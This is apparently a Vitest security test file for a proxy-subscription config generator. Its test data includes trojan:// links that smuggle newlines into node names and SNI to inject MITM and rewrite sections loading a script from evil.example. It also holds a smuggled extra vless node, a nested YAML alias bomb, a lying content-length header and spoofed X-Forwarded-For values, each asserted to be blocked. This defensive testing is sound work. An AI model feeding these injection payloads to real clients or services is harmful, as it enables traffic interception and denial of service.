import { describe, it, expect, afterEach } from 'vitest'
import { Hono } from 'hono'
import { parseSubscription } from '../src/core/sub-parse.ts'
import { parseUri } from '../src/core/uri-parse.ts'
import { generate, type GenContext } from '../src/core/generate.ts'
import { clientIp } from '../src/access.ts'
import { readLimited } from '../src/services/subscription.ts'
import type { Node, Proxy } from '../../shared/types.ts'
import { profile, settings } from './fixtures.ts'

function ctxOf(proxies: Proxy[]): GenContext {
  const nodes: Node[] = proxies.map((p, i) => ({ id: 'n' + i, name: p.name, proxy: p, source: { kind: 'manual' }, enabled: true, tags: [], createdAt: 0 }))
  return { nodes, subscriptions: [], templates: [], customRules: [], settings }
}

const p0 = profile({ addFlags: false, regionGroups: false })

describe('Surge / Loon / QX 配置注入', () => {
  // 机场订阅里的节点名 / SNI 带换行，不能变成新的配置行
  const evil = [
    'trojan://pw@1.2.3.4:443?sni=a.com#HK%0A%5Bmitm%5D%0Ahostname%20*%0A%5Brewrite_local%5D%0A%5Ehttps%3A%2F%2F.*%20url%20script-response-body%20https%3A%2F%2Fevil.example%2Fx.js',
    'trojan://pw@5.6.7.8:443?sni=b.com%0A%5BMITM%5D%0Ahostname%20%3D%20*.apple.com#JP',
  ]
  const ctx = ctxOf(evil.map(parseUri))

  for (const target of ['surge', 'loon', 'qx'] as const) {
    it(target, () => {
      const r = generate(ctx, p0, target)
      // 配置段与正常节点生成的完全一致，没有多出来的段
      const sections = (t: string) => t.split('\n').filter((l) => l.startsWith('['))
      const clean = generate(ctxOf([parseUri('trojan://pw@1.2.3.4:443?sni=a.com#HK')]), p0, target)
      expect(sections(r.text)).toEqual(sections(clean.text))
      expect(r.text).not.toMatch(/^(hostname|\^https)/m)
      // 节点名里的换行换成空格，仍是同一行；参数带换行的节点跳过并给出提示
      expect(r.text).toMatch(/HK \[mitm\] hostname \* \[rewrite_local\] \^https/)
      expect(r.text).not.toMatch(/5\.6\.7\.8|\bJP\b/)
      expect(r.warnings.some((w) => /「JP」.*控制字符/.test(w))).toBe(true)
    })
  }

  it('v2ray 分享链接不会多出节点', () => {
    const p: Proxy = { name: 'x', type: 'socks5', server: '1.1.1.1\nvless://evil@6.6.6.6:443', port: 1080 }
    const r = generate(ctxOf([p]), p0, 'v2ray')
    expect(Buffer.from(r.text, 'base64').toString()).not.toMatch(/evil/)
    expect(r.warnings.some((w) => /控制字符/.test(w))).toBe(true)
  })
})

describe('YAML 别名展开', () => {
  it('拒绝嵌套别名炸弹', () => {
    let y = 'a0: &a0 ["xxxxxxxx","x","x","x","x","x","x","x","x","x"]\n'
    for (let i = 1; i <= 7; i++) y += `a${i}: &a${i} [${Array(10).fill('*a' + (i - 1)).join(',')}]\n`
    y += 'proxies: [{name: n, type: ss, server: 1.1.1.1, port: 1, cipher: aes-128-gcm, password: p, x: *a7}]\n'
    const r = parseSubscription(y)
    expect(r.proxies).toHaveLength(0)
  })
  it('正常配置里的大量锚点复用仍然可用', () => {
    let y = 'opts: &o {mode: websocket, host: a.com}\nproxies:\n'
    for (let i = 0; i < 500; i++) y += `  - {name: n${i}, type: ss, server: 1.1.1.1, port: 1, cipher: aes-128-gcm, password: p, plugin: v2ray-plugin, plugin-opts: *o}\n`
    expect(parseSubscription(y).proxies).toHaveLength(500)
  })
})

describe('YAML 合并键', () => {
  it('节点用 <<: *base 复用公共字段', () => {
    const y = [
      'base: &b {type: ss, server: 1.1.1.1, cipher: aes-128-gcm, password: p, udp: true}',
      'proxies:',
      '  - {<<: *b, name: a, port: 1}',
      '  - <<: *b',
      '    name: b',
      '    port: 2',
      '    server: 2.2.2.2',
    ].join('\n')
    const r = parseSubscription(y)
    expect(r.proxies.map((p) => [p.name, p.server, p.port, p.type, p.udp])).toEqual([
      ['a', '1.1.1.1', 1, 'ss', true],
      ['b', '2.2.2.2', 2, 'ss', true],
    ])
    expect(r.proxies[0]).not.toHaveProperty('<<')
  })
  it('合并键同样受别名展开上限约束', () => {
    let y = 'a0: &a0 {k: "xxxxxxxx"}\n'
    for (let i = 1; i <= 7; i++) y += `a${i}: &a${i} [${Array(10).fill('*a' + (i - 1)).join(',')}]\n`
    y += 'proxies: [{<<: {x: *a7}, name: n, type: ss, server: 1.1.1.1, port: 1}]\n'
    expect(parseSubscription(y).proxies).toHaveLength(0)
  })
})

describe('下载大小上限', () => {
  it('超过上限时报错', async () => {
    const big = new Response(new Uint8Array(2048))
    await expect(readLimited(big, 1024)).rejects.toThrow(/超过/)
    const lied = new Response('x', { headers: { 'content-length': '999999' } })
    await expect(readLimited(lied, 1024)).rejects.toThrow(/超过/)
  })
  it('上限以内正常读取（含 UTF-8 多字节字符）', async () => {
    expect(await readLimited(new Response('节点🚀'), 1024)).toBe('节点🚀')
  })
})

describe('客户端 IP', () => {
  const app = new Hono().get('/', (c) => c.text(clientIp(c)))
  const ip = async (remote: string, headers: Record<string, string>) =>
    (await app.request('/', { headers }, { incoming: { socket: { remoteAddress: remote } } })).text()
  afterEach(() => {
    delete process.env.TRUST_PROXY
  })

  it('auto：只取 X-Forwarded-For 最右侧，不采信客户端自带的其他头', async () => {
    const h = { 'x-forwarded-for': '6.6.6.6, 203.0.113.9', 'cf-connecting-ip': '6.6.6.6', 'x-real-ip': '6.6.6.6' }
    expect(await ip('127.0.0.1', h)).toBe('203.0.113.9')
    expect(await ip('::ffff:172.17.0.1', h)).toBe('203.0.113.9')
    // 直连的公网来源不读请求头
    expect(await ip('198.51.100.7', h)).toBe('198.51.100.7')
    // 无效值退回连接地址
    expect(await ip('127.0.0.1', { 'x-forwarded-for': 'garbage' })).toBe('127.0.0.1')
  })
  it('cloudflare / x-real-ip / none', async () => {
    const h = { 'x-forwarded-for': '6.6.6.6', 'cf-connecting-ip': '203.0.113.1', 'x-real-ip': '203.0.113.2' }
    process.env.TRUST_PROXY = 'cloudflare'
    expect(await ip('127.0.0.1', h)).toBe('203.0.113.1')
    process.env.TRUST_PROXY = 'x-real-ip'
    expect(await ip('127.0.0.1', h)).toBe('203.0.113.2')
    process.env.TRUST_PROXY = 'none'
    expect(await ip('172.17.0.1', h)).toBe('172.17.0.1')
  })
})
